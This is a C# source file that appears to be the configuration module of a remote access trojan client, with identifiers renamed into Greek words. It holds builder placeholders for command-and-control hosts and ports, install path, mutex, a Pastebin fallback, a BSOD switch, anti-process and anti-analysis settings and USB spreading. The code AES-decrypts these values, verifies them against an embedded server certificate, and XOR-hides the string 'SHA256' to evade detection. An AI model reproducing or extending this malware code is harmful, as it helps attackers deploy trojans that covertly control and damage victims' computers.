using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Peg.ICARUS;

namespace Peg
{
    public static class Settings
    {
        public static string Por_ts = "%Ports%";
        public static string Hos_ts = "%Hosts%";
        public static string Ver_sion = "%Version%";
        public static string Egkatastash = "%Install%";
        public static string Install_Folder = "%Folder%";
        public static string Install_File = "%File%";
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certifi_cate = "%Certificate%";
        public static string Server_signa_ture = "%Serversignature%";
        public static X509Certificate2 Server_Certificate;
        public static Aetos aes256;
        public static string BinToGo = "%Paste_bin%";
        public static string ODBS = "%BSOD%";
        public static string Hw_id;
        public static string De_lay = "%Delay%";
        public static string Group = "%Group%";
        public static string ProstathsYlhs = "%AntiProcess%";
        public static string Prostaths = "%Anti%";
        public static string Aspida = "%Aspida%";
        public static string AlphaOmega = "%AlphaOmega%";
        public static string PProstaths = "%Prostaths%";
        public static string USB = "%USB%";
        public static string Exclude = "%Exclude%";

        public static bool InitializeSettings()
        {
            try
            {
                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                aes256 = new Aetos(Key);
                Por_ts = aes256.Decrypt(Por_ts);
                Hos_ts = aes256.Decrypt(Hos_ts);
                Ver_sion = aes256.Decrypt(Ver_sion);
                Egkatastash = aes256.Decrypt(Egkatastash);
                MTX = aes256.Decrypt(MTX);
                BinToGo = aes256.Decrypt(BinToGo);
                Prostaths = aes256.Decrypt(Prostaths);
                ProstathsYlhs = aes256.Decrypt(ProstathsYlhs);
                ODBS = aes256.Decrypt(ODBS);
                Group = aes256.Decrypt(Group);
                Hw_id = YlhSysthmatos.Ylh();
                Server_signa_ture = aes256.Decrypt(Server_signa_ture);
                Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
                return VerifyHash();
            }
            catch
            {
                return false;
            }
        }

        private static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
                using (var sha = new SHA256Managed())
                {
                    return csp.VerifyHash(sha.ComputeHash(Encoding.UTF8.GetBytes(Key)),
                        CryptoConfig.MapNameToOID(thebook("YBK8?<")), Convert.FromBase64String(Server_signa_ture));
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static string thebook(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }
}